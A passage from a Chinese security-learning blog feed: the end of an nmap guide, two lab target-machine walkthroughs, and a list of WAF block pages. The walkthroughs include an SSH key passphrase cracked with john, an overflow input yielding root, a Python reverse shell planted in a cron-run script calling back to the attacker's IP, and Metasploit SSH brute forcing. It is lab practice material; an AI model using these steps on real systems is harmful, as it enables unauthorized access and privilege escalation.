src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-O.jpg" alt="nmap -O扫描"></p><br><h2 id="脚本扫描"><a href="#脚本扫描" class="headerlink" title="脚本扫描"></a>脚本扫描</h2><div class="code-wrapper"><pre><code class="hljs shell">nmap --script 具体的脚本 目标</code></pre></div><p>nmap官方脚本文档 : <a href="https://nmap.org/nsedoc/">https://nmap.org/nsedoc/</a></p><p>左侧列出了脚本的分类，点击分类 可以看到每一个分类下有很多具体的脚本供我们使用。14大分类具体对应为</p><ul><li><a href="https://nmap.org/nsedoc/categories/auth.html">auth</a> : 负责处理鉴权证书的脚本</li><li><a href="https://nmap.org/nsedoc/categories/broadcast.html">broadcast</a> : 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务  </li><li><a href="https://nmap.org/nsedoc/categories/brute.html">brute</a> : 提供暴力破解方式，针对常见的应用如http/snmp等  </li><li><a href="https://nmap.org/nsedoc/categories/default.html">default</a> : 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力  </li><li><a href="https://nmap.org/nsedoc/categories/discovery.html">discovery</a> : 对网络进行更多的信息，如SMB枚举、SNMP查询等</li><li><a href="https://nmap.org/nsedoc/categories/dos.html">dos</a> : 用于进行拒绝服务攻击  </li><li><a href="https://nmap.org/nsedoc/categories/exploit.html">exploit</a> : 利用已知的漏洞入侵系统  </li><li><a href="https://nmap.org/nsedoc/categories/external.html">external</a> : 利用第三方的数据库或资源，例如进行whois解析  </li><li><a href="https://nmap.org/nsedoc/categories/fuzzer.html">fuzzer</a> : 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞</li><li><a href="https://nmap.org/nsedoc/categories/intrusive.html">intrusive</a> : 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽</li><li><a href="https://nmap.org/nsedoc/categories/malware.html">malware</a> : 探测目标机是否感染了病毒、开启了后门等信息  </li><li><a href="https://nmap.org/nsedoc/categories/safe.html">safe</a> : 此类与intrusive相反，属于安全性脚本  </li><li><a href="https://nmap.org/nsedoc/categories/version.html">version</a> : 负责增强服务与版本扫描（Version Detection）功能的脚本</li><li><a href="https://nmap.org/nsedoc/categories/vuln.html">vuln</a> : 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</li></ul><h3 id="对SSH进行暴力破解"><a href="#对SSH进行暴力破解" class="headerlink" title="对SSH进行暴力破解"></a>对SSH进行暴力破解</h3><p>账号密码不是弱口令,所以结果是跑不出来🤣</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sC.jpg" alt="nmap -sC-SSH"></p><br><h2 id="时间模板"><a href="#时间模板" class="headerlink" title="时间模板"></a>时间模板</h2><h3 id="T-lt-0-5-gt-设置时间模板"><a href="#T-lt-0-5-gt-设置时间模板" class="headerlink" title="-T&lt;0-5&gt; 设置时间模板"></a>-T&lt;0-5&gt; 设置时间模板</h3><div class="code-wrapper"><pre><code class="hljs shell">nmap -sS -T&lt;0-5&gt; 192.168.1.148</code></pre></div><p>优化时间控制选项的功能很强大也很有效，但有些用户会被迷惑。此外， 往往选择合适参数的时间超过了所需优化的扫描时间。因此，Nmap提供了一些简单的 方法，使用6个时间模板，使用时采用-T选项及数字(0 - 5) 或名称。模板名称有<code>paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)</code></p><ul><li>paranoid、sneaky模式用于IDS躲避</li><li>Polite模式降低了扫描 速度以使用更少的带宽和目标主机资源。</li><li>Normal为默认模式，因此-T3 实际上是未做任何优化。</li><li>Aggressive模式假设用户具有合适及可靠的网络从而加速 扫描.</li><li>nsane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。</li></ul><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-T.jpg" alt="nmap -T"></p><h2 id="其他选项"><a href="#其他选项" class="headerlink" title="其他选项"></a>其他选项</h2><h3 id="A-综合扫描"><a href="#A-综合扫描" class="headerlink" title="-A 综合扫描"></a>-A 综合扫描</h3><p>此选项包含了 1-10000端口ping扫描 , 操作系统扫描 , 脚本扫描 , 路由追踪 , 服务探测</p><div class="code-wrapper"><pre><code class="hljs shell">nmap -A 192.168.50.148</code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-A.jpg" alt="nmap -A"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH-私钥泄露</title>
      <link href="/Study/post/SSH-private-key-is-eaked/"/>
      <url>/Study/post/SSH-private-key-is-eaked/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-环境配置"><a href="#0x00-环境配置" class="headerlink" title="0x00 环境配置"></a>0x00 环境配置</h2><ol><li>   SSH-私钥泄露靶机</li><li>   Kali 攻击机</li><li>   靶机与攻击机处于同一网段</li></ol><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><ol><li><p>寻找靶机IP</p><p>可以使用<code>netdiscover</code>或者 <code>nmap</code>进行IP扫描</p><div class="code-wrapper"><pre><code class="hljs shell">netdiscover 10.112.132.0/24nmap 10.112.132.0/24</code></pre></div></li></ol><ol start="2"><li><p>扫描服务</p><p>因为是使用了nmap进行了扫描IP , 所以顺便把服务也一起扫描了</p><div class="code-wrapper"><pre><code class="hljs shell">nmap -A -T4 10.112.132.16</code></pre></div><p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/nmap.jpg?raw=true" alt="nmap.jpg"></p></li></ol><ol start="3"><li><p>目录扫描</p><p>从nmap扫描结果得知 , 一共存在3个端口 22(SSH) , 80(HTTP) , 31337(ELIET) , 在nmap 综合扫描选项扫描靶机 , 能发现 31337也是运行Http服务 , 对两个Http服务的端口进行目录扫描 , 80结果为空 , 31337结果发现<code>.ssh</code>文件夹</p><p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/dirsearch.jpg?raw=true" alt="dirsearch"></p><p>robots.txt 有个/taxes目录 , 访问得到一个Flag</p><p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/robots.txt.jpg?raw=true" alt="robots.txt"></p><p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Flag1.jpg?raw=true" alt="Flag1"></p><p>访问<code>.ssh</code>下载三个文件</p><p>​    a.    authorized_keys - 公钥</p><p>​    b.    id_rsa - 私钥</p><p>​    c.    id_rsa.pub - 私钥证书</p></li></ol><h2 id="0x02-SSH连接"><a href="#0x02-SSH连接" class="headerlink" title="0x02 SSH连接"></a>0x02 SSH连接</h2><p>关于SSH的一些知识-转自<code>TelCruel</code> <a href="https://telcruel.gitee.io/2019/09/21/SSH/">传送门</a></p><ol><li><p>公钥</p><p>查看公钥发现用户名为<code>simon</code></p><p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/autorized_key.jpg?raw=true" alt="autorized_keys"></p></li></ol><ol start="2"><li><p>私钥</p><p>尝试使用公钥登录 , 提示没权限</p><div class="code-wrapper"><pre><code class="hljs shell">ssh -i id_rsa simon@10.112.132.16</code></pre></div><p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Permission_Denied.jpg?raw=true" alt="Permission_Denied"></p><p>​</p><p>修改权限 , 再次尝试登录 , 提示需要密码</p><div class="code-wrapper"><pre><code class="hljs shell">chmod 600 id_rsassh -i id_rsa simon@10.112.132.16</code></pre></div><p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/SSH_login_not_password.jpg?raw=true" alt="SSH_login_not_password"></p><p>​</p></li><li><p>破解私钥</p><p>使用<code>ssh2john</code>对 id_rsa 秘钥信息转为 John可以识别的信息 , 让使用zcat 破解isacrack 信息</p><div class="code-wrapper"><pre><code class="hljs shell">/usr/share/john/ssh2john.py id_rsa &gt; isacrackzcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rules isacrack</code></pre></div><p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Zcat&Join.jpg?raw=true" alt="Zcat&amp;Join"></p><p>破解出密码为: <code>starwars</code> , 再次登录</p><p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/SSH_login.jpg?raw=true" alt="SSH_login"></p></li></ol><ol start="4"><li><p>信息收集</p><p>在root 目录下 有个 <code>flag.txt</code>与 ‘read_message.c’  , flag.txt没权限打开 , read_message.c查看发现第二个flag  , 且提示我们需要执行这个源码</p><p><img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/Flag2.jpg?raw=true" alt="Flag2"></p><p>查找已经编译的程序,并执行</p><div class="code-wrapper"><pre><code class="hljs shel">find / -name &quot;*read_message*&quot; 2&gt;/dev/null</code></pre></div></li></ol><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>​    这个程序是一个简单的溢出攻击(然而我不会 (汗颜)),直接照搬<code>TelCruel</code>的WP了</p><div class="code-wrapper"><pre><code> 这里因为gets（buf）没有限制读取的长度，但是buf[]这个数组只能储存20个字符，那么超过20个字符的就会存入缓冲区，将后面的内容覆盖。然后当执行到execve的时候原来要执行program[]内的字符，被覆盖后就可以利用了。所以只要输入SimonAAAAAAAAAAAAAAA/bin/sh,即可进入root的shell</code></pre></div><p>​    执行后 , 权限提升至root , 查看flag.txt 得到 第三个Flag</p><p>​    <img src="https://github.com/MokYan/Figurebed/blob/master/drone/SSH-Server/SSH-%20private%20key%20is%20eaked/flag3.jpg?raw=true" alt="Flag3"></p>]]></content>
      
      
      <categories>
          
          <category> 靶机练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH-服务渗透root主机</title>
      <link href="/Study/post/SSH-Service-penetrates-the-root-host/"/>
      <url>/Study/post/SSH-Service-penetrates-the-root-host/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-环境配置"><a href="#0x00-环境配置" class="headerlink" title="0x00 环境配置"></a>0x00 环境配置</h2><ol><li>   SSH-服务渗透root主机靶机</li><li>   Kali 攻击机</li><li>   靶机与攻击机处于同一网段</li></ol><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><ol><li><p>寻找靶机IP</p><p>由于Kali与靶机在统一网段 , 所以直接扫Kali IP所在的网段 , 使用netdiscover进行扫描</p><div class="code-wrapper"><pre><code class="hljs shell">netdiscover 10.112.132.0/24</code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/netdiscover.jpg" alt="netdiscover"></p></li><li><p>扫描靶机服务</p><p>得知靶机的IP后 , 使用nmap进行服务扫描 , <a href="https://mokyan.github.io/post/nmap-xue-xi-shou-ce/">nmap学习手册</a>传送门</p><div class="code-wrapper"><pre><code class="hljs shell">nmap -A -T4 10.112.132.18</code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-nmap-A.jpg" alt="nmap-A"></p></li></ol><p>3.访问端口服务</p><p>​    从扫描结果中发现80端口 , 访问80端口 , 通过wappalyzer , 确定是一个静态HTML页面 , 中间件为Apache , 系统为Debian , 页面有几个 人名 与 邮箱</p><p>​    <img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/about-Us.jpg" alt="人名与邮箱"></p><p>​    通过nmap扫描结果和robots.txt内容 , 得到<code>/wordpress-blog</code>和<code>/files</code>两个目录 , 一个为空 , 一个访问得到 <code>YOU JUST GOT TROLLED</code> 淦…</p><p>​    继续深度查找 , 进行目录爆破 , 使用 <code>dirsearch</code>进行目录爆破 <a href="https://github.com/maurosoria/dirsearch">dirsearch传送门</a></p><div class="code-wrapper"><pre><code class="hljs shell">python3 dirsearch.py -u http://10.112.132.18</code></pre></div><p>​    <img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/dirsearch.jpg" alt="dirsearch"></p><p>​    dirsearch 扫描结果发现一个名为 <code>icons</code> 的目录 , 访问目录 , 发现一个奇怪的txt文件 , 打开竟是一个SSH的密钥文件</p><p>​    <img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/txtfile.jpg" alt="txtfile"></p><p>​    <img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-Key.jpg" alt="SSH-KEY"></p><p>​    得到SSH密钥 , 结合之前拿到的人名和邮箱 , 尝试进行SSH登录</p><h2 id="0x02-SSH登录"><a href="#0x02-SSH登录" class="headerlink" title="0x02 SSH登录"></a>0x02 SSH登录</h2><div class="code-wrapper"><pre><code class="hljs shell">ssh -i Key_File Username@Host</code></pre></div><p>使用人名登录 , 只有 martin 是可以登录 , 且密码为空 , 回车就能直接进去 !</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-Login.jpg" alt="SSH-Login"></p><p>查看了权限 , 不是root的 , 需要提权 , <a href="https://zhuanlan.zhihu.com/p/341658060">linux提权常用方式</a></p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/SSH-id.jpg" alt="SSH-id"></p><p>查看计划任务 , 发现 <strong>jimmy</strong> 创建了一个每5分钟就执行一次的Python文件 <strong>sekurity.py</strong> 的计划任务</p><div class="code-wrapper"><pre><code class="hljs shell">cat /etc/crontab</code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/crontab.jpg" alt="crontab"></p><p>查看这个Python文件 , 发现不存在 ! 可以向此处进行反弹shell , 查看是否具有更高的权限</p><div class="code-wrapper"><pre><code class="hljs shell">martin@debian:~$ cat /tmp/sekurity.pycat: /tmp/sekurity.py: Aucun fichier ou dossier de ce typemartin@debian:~$</code></pre></div><p>创建sekurity.py文件 , 编写脚本</p><div class="code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">创建脚本</span>vi /tmp/sekurity.py<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">编辑脚本</span><span class="hljs-meta">#</span><span class="bash">!/usr/bin/python</span>import os,socket,subprocesss=socket.socket()s.connect((&quot;10.112.132.16&quot;,25565)   #攻击机IP，攻击机监听端口（任意空闲端口）os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash"> ESC -&gt; 冒号 -&gt; wq 保存退出</span><span class="hljs-meta">#</span><span class="bash"> 添加执行权限</span>chmod +x /tmp/sekurity.py</code></pre></div><p>在攻击机上面开启监听 , 每5分钟执行一次 , 耐心等待</p><div class="code-wrapper"><pre><code class="hljs shell">nc -lvp 25565</code></pre></div><p>连接成功 , 用户<strong>jimmy</strong>依旧不是 root权限</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/shell-id.jpg" alt="shell-id"></p><h2 id="0x03-SSH爆破"><a href="#0x03-SSH爆破" class="headerlink" title="0x03 SSH爆破"></a>0x03 SSH爆破</h2><p>没办法,只能爆破最后一个用户 <strong>hadi</strong> , 使用品轩字典创建一个字典 , 在网上已经有人跑出来密码为 “hadi123” , 所以我们创建范围 hadi100-hadi199 , 主要介绍爆破方法 !</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/create-dist.jpg" alt="create-dist"></p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/dist.jpg" alt="dist"></p><p>使用 <strong>msfconsole</strong> , 进行SSH爆破</p><div class="code-wrapper"><pre><code class="hljs shell">msfconsolesearch ssh#搜索ssh爆破的脚本<span class="hljs-meta">#</span><span class="bash">auxiliary/scanner/ssh/ssh_login 这个就是ssh登录爆破的脚本</span>use auxiliary/scanner/ssh/ssh_login#使用脚本show options#显示选项set rhosts 10.112.132.19#设置靶机ipset username hadi#设置用户名set pass_file /home/mokyan/桌面/password.txt#设置密码set threads 10#设置线程set verbose true#设置输出详细信息<span class="hljs-meta"></span><span class="hljs-meta">#</span><span class="bash">设置完毕 , run运行</span>run</code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/msfconsole-options.jpg" alt="msfconsole-options"></p><p>爆破成功 , 提示一个会话打开</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/msfconsole-run.jpg" alt="msfconsole-run"></p><p>打开会话,并优化shell</p><div class="code-wrapper"><pre><code class="hljs shell">session -i 1python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</code></pre></div><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/msfconsole-shell.jpg" alt="msfconsole-shell"></p><p>使用su 切换root , 密码经过尝试为hadi123 , 在root目录下找到 flag.txt</p><p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/drone/SSH-Server/SSH-%20Service%20penetrates%20the%20root%20host/flag.jpg" alt="flag"></p>]]></content>
      
      
      <categories>
          
          <category> 靶机练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SSH </tag>
            
            <tag> msfconsole </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[转载] | 常见WAF拦截页面汇总</title>
      <link href="/Study/post/Common-Firewalls/"/>
      <url>/Study/post/Common-Firewalls/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><blockquote><p>前几天在微信公众号 <font color="#b8dcff">@HACK学习呀</font> 看到一片文章 <a href="https://mp.weixin.qq.com/s/PWkqNsygi-c_S7tW1y_Hxw">干货 | 常见WAF拦截页面总结</a> , 文中提到一位大佬 <font color="#b8dcff">@madcoding</font> 的一片文章 <a href="https://www.mad-coding.cn/2019/12/19/waf%E7%9A%84%E8%AF%86%E5%88%AB%E4%B8%8E%E7%BB%95%E8%BF%87%EF%BC%88%E4%B8%8D%E6%96%AD%E8%A1%A5%E5%85%85%EF%BC%89/">WAF的识别与绕过</a> 两篇文章都有相同的资料和不同的资料 , 为了以后方便查阅,所以将两篇文章的资料进行汇总 . 本文所有资料都是根据两篇文章进行整合,所以若有错误的地方,请大佬指出!!!</p></blockquote><br><h2 id="1-360主机卫士或360webscan"><a href="#1-360主机卫士或360webscan" class="headerlink" title="1.    360主机卫士或360webscan"></a>1.    360主机卫士或360webscan</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/360%E4%B8%BB%E6%9C%BA%E5%8D%AB%E5%A3%AB%E6%88%96360webscan.png?raw=true" alt="360主机卫士或360webscan"></p><br><h2 id="2-360网站卫士"><a href="#2-360网站卫士" class="headerlink" title="2.   360网站卫士"></a>2.   360网站卫士</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/360%E7%BD%91%E7%AB%99%E5%8D%AB%E5%A3%AB.png?raw=true" alt="360网站卫士"></p><br><h2 id="3-D盾"><a href="#3-D盾" class="headerlink" title="3.   D盾"></a>3.   D盾</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/D%E7%9B%BE.png?raw=true" alt="D盾"></p><br><h2 id="4-F5-BIG-IP"><a href="#4-F5-BIG-IP" class="headerlink" title="4. F5 BIG-IP"></a>4. F5 BIG-IP</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/F5%20BIG-IP-1.png?raw=true" alt="F5 BIG-IP-1"><br><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/F5%20BIG-IP-2.png?raw=true" alt="F5 BIG-IP-2"><br><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/F5%20BIG-IP-3.png?raw=true" alt="F5 BIG-IP-3"></p><br><h2 id="5-Mod-Security-png"><a href="#5-Mod-Security-png" class="headerlink" title="5.   Mod_Security.png"></a>5.   Mod_Security.png</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/Mod_Security.png?raw=true" alt="Mod_Security.png"></p><br><h2 id="6-Naxsi-WAF"><a href="#6-Naxsi-WAF" class="headerlink" title="6.   Naxsi WAF"></a>6.   Naxsi WAF</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/Naxsi%20WAF.png?raw=true" alt="Naxsi WAF"></p><br><h2 id="7-OpenRASP"><a href="#7-OpenRASP" class="headerlink" title="7.   OpenRASP"></a>7.   OpenRASP</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/OpenRASP.png?raw=true" alt="OpenRASP"></p><br><h2 id="8-UPUPW安全防护"><a href="#8-UPUPW安全防护" class="headerlink" title="8.   UPUPW安全防护"></a>8.   UPUPW安全防护</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/UPUPW%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4.png?raw=true" alt="UPUPW安全防护"></p><br><h2 id="9-dotDefender"><a href="#9-dotDefender" class="headerlink" title="9.   dotDefender"></a>9.   dotDefender</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/dotDefender.png?raw=true" alt="dotDefender"></p><br><h2 id="10-云锁"><a href="#10-云锁" class="headerlink" title="10.  云锁"></a>10.  云锁</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E4%BA%91%E9%94%81.png?raw=true" alt="云锁"></p><br><h2 id="11-创宇盾"><a href="#11-创宇盾" class="headerlink" title="11.  创宇盾"></a>11.  创宇盾</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%88%9B%E5%AE%87%E7%9B%BE.png?raw=true" alt="创宇盾"></p><br><h2 id="12-华为云"><a href="#12-华为云" class="headerlink" title="12.  华为云"></a>12.  华为云</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%8D%8E%E4%B8%BA%E4%BA%91.png?raw=true" alt="华为云"></p><br><h2 id="13-南京铱讯waf"><a href="#13-南京铱讯waf" class="headerlink" title="13.  南京铱讯waf"></a>13.  南京铱讯waf</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%8D%97%E4%BA%AC%E9%93%B1%E8%AE%AF%20waf.png?raw=true" alt="南京铱讯waf"></p><br><h2 id="14-奇安信网站卫士"><a href="#14-奇安信网站卫士" class="headerlink" title="14.  奇安信网站卫士"></a>14.  奇安信网站卫士</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%A5%87%E5%AE%89%E4%BF%A1%E7%BD%91%E7%AB%99%E5%8D%AB%E5%A3%AB.png?raw=true" alt="奇安信网站卫士"></p><br><h2 id="15-安全狗"><a href="#15-安全狗" class="headerlink" title="15.  安全狗"></a>15.  安全狗</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%AE%89%E5%85%A8%E7%8B%97.png?raw=true" alt="安全狗"></p><br><h2 id="16-安域云WAF"><a href="#16-安域云WAF" class="headerlink" title="16.  安域云WAF"></a>16.  安域云WAF</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%AE%89%E5%9F%9F%E4%BA%91WAF.png?raw=true" alt="安域云WAF"></p><br><h2 id="17-安恒明御WAF"><a href="#17-安恒明御WAF" class="headerlink" title="17. 安恒明御WAF"></a>17. 安恒明御WAF</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%AE%89%E6%81%92%E6%98%8E%E5%BE%A1WAF.png?raw=true" alt="安恒明御WAF"></p><br><h2 id="18-宝塔网站防火墙"><a href="#18-宝塔网站防火墙" class="headerlink" title="18.  宝塔网站防火墙"></a>18.  宝塔网站防火墙</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E5%AE%9D%E5%A1%94%E7%BD%91%E7%AB%99%E9%98%B2%E7%81%AB%E5%A2%99.png?raw=true" alt="宝塔网站防火墙"></p><br><h2 id="19-护卫神"><a href="#19-护卫神" class="headerlink" title="19.  护卫神"></a>19.  护卫神</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E6%8A%A4%E5%8D%AB%E7%A5%9E.png?raw=true" alt="护卫神"></p><br><h2 id="20-智创防火墙"><a href="#20-智创防火墙" class="headerlink" title="20.  智创防火墙"></a>20.  智创防火墙</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E6%99%BA%E5%88%9B%E9%98%B2%E7%81%AB%E5%A2%99.png?raw=true" alt="智创防火墙"></p><br><h2 id="21-未知云WAF"><a href="#21-未知云WAF" class="headerlink" title="21.  未知云WAF"></a>21.  未知云WAF</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E6%9C%AA%E7%9F%A5%E4%BA%91WAF.png?raw=true" alt="未知云WAF"></p><br><h2 id="22-玄武盾"><a href="#22-玄武盾" class="headerlink" title="22.  玄武盾"></a>22.  玄武盾</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%8E%84%E6%AD%A6%E7%9B%BE.png?raw=true" alt="玄武盾"></p><br><h2 id="23-百度云"><a href="#23-百度云" class="headerlink" title="23.  百度云"></a>23.  百度云</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%99%BE%E5%BA%A6%E4%BA%91.png?raw=true" alt="百度云"></p><br><h2 id="24-网宿云"><a href="#24-网宿云" class="headerlink" title="24.  网宿云"></a>24.  网宿云</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%BD%91%E5%AE%BF%E4%BA%91-2.png?raw=true" alt="网宿云-1"><br><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%BD%91%E5%AE%BF%E4%BA%91.png?raw=true" alt="网宿云-2"></p><br><h2 id="25-网防G01"><a href="#25-网防G01" class="headerlink" title="25.  网防G01"></a>25.  网防G01</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E7%BD%91%E9%98%B2G01.png?raw=true" alt="网防G01"></p><br><h2 id="26-腾讯云"><a href="#26-腾讯云" class="headerlink" title="26.  腾讯云"></a>26.  腾讯云</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E8%85%BE%E8%AE%AF%E4%BA%91.png?raw=true" alt="腾讯云"></p><br><h2 id="27-腾讯宙斯盾"><a href="#27-腾讯宙斯盾" class="headerlink" title="27.  腾讯宙斯盾"></a>27.  腾讯宙斯盾</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E8%85%BE%E8%AE%AF%E5%AE%99%E6%96%AF%E7%9B%BE.png?raw=true" alt="腾讯宙斯盾"></p><br><h2 id="28-腾讯门神"><a href="#28-腾讯门神" class="headerlink" title="28.  腾讯门神"></a>28.  腾讯门神</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E8%85%BE%E8%AE%AF%E9%97%A8%E7%A5%9E.png?raw=true" alt="腾讯门神"></p><br><h2 id="29-西数WTS-WAF"><a href="#29-西数WTS-WAF" class="headerlink" title="29.  西数WTS-WAF"></a>29.  西数WTS-WAF</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E8%A5%BF%E6%95%B0WTS-WAF.png?raw=true" alt="西数WTS-WAF"></p><br><h2 id="30-铱讯WAF"><a href="#30-铱讯WAF" class="headerlink" title="30.  铱讯WAF"></a>30.  铱讯WAF</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E9%93%B1%E8%AE%AFWAF.png?raw=true" alt="铱讯WAF"></p><br><h2 id="31-长亭SafeLine"><a href="#31-长亭SafeLine" class="headerlink" title="31.  长亭SafeLine"></a>31.  长亭SafeLine</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E9%95%BF%E4%BA%ADSafeLine.png?raw=true" alt="长亭SafeLine"></p><br><h2 id="32-阿里云盾"><a href="#32-阿里云盾" class="headerlink" title="32.  阿里云盾"></a>32.  阿里云盾</h2><p><img src="https://github.com/MokYan/Figurebed/blob/master/WAF/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%BE.png?raw=true" alt="阿里云盾"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> WAF </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS弹窗练习 ：http://test.xss.tv</title>
      <link href="/Study/post/XSS-Exercise-2/"/>
      <url>/Study/post/XSS-Exercise-2/</url>
      
